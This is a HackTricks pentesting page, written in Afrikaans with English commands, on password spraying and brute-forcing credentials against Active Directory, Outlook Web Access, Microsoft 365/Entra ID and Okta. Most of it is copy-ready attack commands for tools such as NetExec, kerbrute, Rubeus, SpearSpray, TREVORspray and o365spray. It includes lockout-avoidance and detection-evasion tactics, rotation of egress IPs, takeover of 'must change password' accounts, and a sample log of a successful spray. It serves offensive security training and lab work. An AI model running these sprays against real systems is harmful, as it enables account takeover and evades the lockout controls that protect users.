# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Sodra jy verskeie **geldige gebruikersname** gevind het, kan jy die **mees algemene wagwoorde** (hou die password policy van die omgewing in gedagte) met elkeen van die ontdekte gebruikers probeer.\
By **verstek** is die **minimum** **wagwoord** **lengte** **7**.

Lyste van algemene gebruikersname kan ook nuttig wees: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Let daarop dat jy **sommige rekeninge kan sluit as jy verskeie verkeerde wagwoorde probeer** (by verstek meer as 10).

### Kry password policy

As jy sommige gebruikerbewyse of ’n shell as ’n domain user het, kan jy die password policy **verkry met**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Exploitation vanaf Linux (of almal)

- Using **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Gebruik van **NetExec (CME successor)** vir geteikende, low-noise spraying oor SMB/WinRM:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- Deur [**kerbrute**](https://github.com/ropnop/kerbrute) (Go) te gebruik
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(jy kan die aantal pogings aandui om rekeninguitsluitings te vermy):**_<sup>[[3]](#references)</sup>
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Deur [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) te gebruik - NIE AANBEVEEL NIE, WERK SOMS NIE<sup>[[2]](#references)</sup>
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Met die `scanner/smb/smb_login`-module van **Metasploit**:

![Password Spraying - Brute-Force: With the scanner/smb/smb login module of Metasploit](<../../images/image (745).png>)

- Deur **rpcclient** te gebruik:<sup>[[6]](#references)</sup>
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Vanaf Windows

- Met ’n [Rubeus](https://github.com/Zer1t0/Rubeus)-weergawe met brute module:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Met [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Dit kan by verstek gebruikers uit die domein genereer en sal die wagwoordbeleid uit die domein verkry en pogings daarvolgens beperk):<sup>[[4]](#references)</sup>
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Met [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Identifiseer en Neem "Password must change at next logon"-rekeninge oor (SAMR)

'n Low-noise-tegniek is om 'n benign/empty password te spray en rekeninge te identifiseer wat STATUS_PASSWORD_MUST_CHANGE terugstuur, wat aandui dat die password geforseerd verval het en verander kan word sonder om die ou een te ken.<sup>[[9]](#references)[[10]](#references)</sup>

Werksvloei:
- Enumerate users (RID brute via SAMR) om die doelwitlys op te stel:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spray ’n leë wagwoord en gaan voort met treffers om rekeninge vas te lê wat dit by die volgende aanmelding moet verander:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Verander die wagwoord vir elke treffer oor SAMR met NetExec se module (geen ou wagwoord word benodig wanneer "must change" gestel is):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Operasionele notas:
- Maak seker dat jou host se klok met die DC gesinchroniseer is voordat jy Kerberos-gebaseerde operasies uitvoer: `sudo ntpdate <dc_fqdn>`.
- ’n [+] sonder (Pwn3d!) in sommige modules (bv. RDP/WinRM) beteken dat die creds geldig is, maar dat die account nie interaktiewe logon-regte het nie.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying met LDAP-teikening en PSO-bewuste throttling (SpearSpray)

Kerberos pre-auth-gebaseerde spraying verminder geraas in vergelyking met SMB/NTLM/LDAP bind-pogings en pas beter by AD lockout-beleide. SpearSpray kombineer LDAP-gedrewe teikening, ’n patroon-enjin en beleidsbewustheid (domeinbeleid + PSO’s + badPwdCount-buffer) om presies en veilig te spray. Dit kan ook gekompromitteerde principals in Neo4j merk vir BloodHound-pathing.<sup>[[1]](#references)</sup>

Belangrike idees:
- LDAP-gebruikersontdekking met paging en LDAPS-ondersteuning, opsioneel met pasgemaakte LDAP-filters.
- Domein-lockout-beleid + PSO-bewuste filtering om ’n konfigureerbare pogingbuffer (threshold) te behou en te voorkom dat gebruikers gelock word.
- Kerberos pre-auth-validering met vinnige gssapi-bindings (genereer 4768/4771 op DC’s in plaas van 4625).
- Patroongebaseerde, per-gebruiker-wagwoordgenerering met veranderlikes soos name en temporale waardes wat van elke gebruiker se pwdLastSet afgelei word.
- Throughput-beheer met threads, jitter en maksimum requests per sekonde.
- Opsionele Neo4j-integrasie om owned users vir BloodHound te merk.

Basiese gebruik en discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Teiken- en patroonbeheer:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Stealth- en veiligheidskontroles:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound-verryking:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Oorsig van patroonstelsel (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Beskikbare veranderlikes sluit in:
- {name}, {samaccountname}
- Temporale data vanaf elke gebruiker se pwdLastSet (of whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Samestellingshelpers en organisasietoken: {separator}, {suffix}, {extra}

Operasionele notas:

- Verkies om die PDC-emulator met -dc te raadpleeg om die mees gesaghebbende badPwdCount en beleidverwante inligting te lees.
- badPwdCount-terugstellings word deur die volgende poging ná die waarnemingsvenster geaktiveer; gebruik die drempel en tydsberekening om veilig te bly.
- Kerberos pre-auth-pogings verskyn as 4768/4771 in DC-telemetrie; gebruik jitter en tempo-beperking om onopvallend in te meng.

> Wenke: SpearSpray se verstek LDAP-bladsygrootte is 200; pas dit met -lps aan soos nodig.

## Outlook Web Access

Daar is verskeie tools vir p**assword spraying outlook**.

- Met [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- met [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Met [Ruler](https://github.com/sensepost/ruler) (betroubaar!)<sup>[[5]](#references)</sup>
- Met [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- Met [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Om enige van hierdie tools te gebruik, benodig jy ’n gebruikerslys en ’n password / ’n klein lys passwords om te spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

Vir cloud spraying, identifiseer eers of die tenant **managed**, **federated** of **hybrid** is, omdat die endpoint en die lockout-gedrag van on-prem AD kan verskil. In Microsoft Entra verander **Smart Lockout** hoe herhaalde raaiskote die lockout-begroting gebruik:<sup>[[7]](#references)</sup>

- Deur dieselfde **verkeerde wagwoord** te herhaal, word die lockout-teller nie verder verhoog nie, maar deur **nuwe kandidate** te probeer, word dit wel verhoog.
- **Familiar** en **unfamiliar** liggings het **afsonderlike** tellers.
- Tenants wat **pass-through authentication (PTA)** gebruik, trek nie voordeel uit die nasporing van hashes van verkeerde wagwoorde nie; behandel hulle dus meer soos klassieke lockout-sensitiewe teikens.

In die praktyk, spray **een wagwoord per rondte**, laat genoeg tyd tussen rondtes toe, en verkies tooling wat die tenant se werklike auth flow kan ontdek voordat dit raaiskote stuur.

- Met [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray) kan jy die tenant recon, die `token_endpoint` ontdek, `msol`/`adfs`/`owa`/`okta` spray, en verkeer deur verskeie egress-IP's roteer:
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- Met [**Spray365**](https://github.com/MarkoH17/Spray365) kan jy vooraf ’n hervatbare **execution plan** opstel, die auth-volgorde randomiseer en ’n **minimum delay per user** afdwing om buite die lockout window te bly:
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- Met [**o365spray**](https://github.com/0xZDH/o365spray) kan jy die tenant valideer, gebruikers enumerateer met modules soos `onedrive`, en via `oauth2` of `adfs` spray terwyl jy **een poging per gebruiker** per uitsluitingsvenster handhaaf. As jy reeds ’n FireProx API het, gee dit met `--proxy-url` deur om die bron-IP’s te versprei:
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
Onlangse operator tradecraft het ook in die rigting van **distributed cloud spraying** beweeg. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) ondersteun tydvensters, password shuffling, ADFS/M365 spraying en outomatiese post-auth exfiltration. Onlangse misbruik in die werklike wêreld het ook **Microsoft Teams API**-rekeningenumerasie en **AWS region rotation** gebruik om spray-golwe oor verskeie brongeografieë te versprei.<sup>[[8]](#references)</sup>

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Verwysings

- [1] [SpearSpray – Verbeter jou Active Directory Password Spraying met User Intelligence](https://github.com/sikumy/spearspray)
- [2] [TarlogicSecurity/kerbrute – Kerberos bruteforcing met Impacket (Python)](https://github.com/TarlogicSecurity/kerbrute)
- [3] [Spray – ’n Password Spraying-instrument vir Active Directory Credentials](https://github.com/Greenwolf/Spray)
- [4] [Active Directory Password Spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [5] [Password Spraying Outlook Web Access: Remote Shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [6] [Password Spraying en ander pret met RPCCLIENT](https://www.blackhillsinfosec.com/?p=5296)
- [7] [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [8] [Proofpoint: Aanvallers loods TeamFiltration: Account Takeover-veldtog](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [9] [HTB Sendai – 0xdf: van spray na gMSA na DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [10] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)

{{#include ../../banners/hacktricks-training.md}}
